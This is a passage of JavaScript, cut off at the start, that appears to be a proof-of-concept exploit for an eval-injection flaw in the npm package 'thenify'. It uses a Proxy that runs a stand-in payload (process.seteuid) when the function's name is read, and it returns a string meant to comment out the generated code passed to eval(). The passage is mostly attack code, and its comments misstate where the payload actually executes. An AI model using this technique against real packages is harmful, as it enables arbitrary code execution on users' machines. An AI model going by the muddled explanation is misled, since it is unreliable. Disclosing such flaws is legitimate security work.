   // Direct assignment to Function.prototype.name throws a TypeError in modern JS.
   // We bypass this restriction by using a Proxy that intercepts property reads.
   // When `thenify` accesses `.name`, the proxy triggers our malicious logic.
   const injectedFunc = new Proxy(function noop() {}, {
     get(target, prop) {
       if (prop === 'name') {
         // 1. Execute the proof-of-concept payload immediately upon property access.
         process.seteuid(42);

         // 2. Return a string that comments out the rest of the dynamically generated code.
         //    Using `//\n` safely ignores the trailing unbalanced parentheses/braces 
         //    generated by `createWrapper`, preventing immediate parser crashes from 
         //    unclosed syntax while still allowing our side-effect to run first.
         return "x //\n"; 
       }
       return target[prop];
     }
   });

   // `thenify` reads `.name`, interpolates it into a string literal, and passes
   // the result directly to `eval()`. The Proxy successfully intercepts the read 
   // operation, triggers our injected code, and manipulates the input passed to `eval()`.
   return thenify(injectedFunc);
}

await exploit();
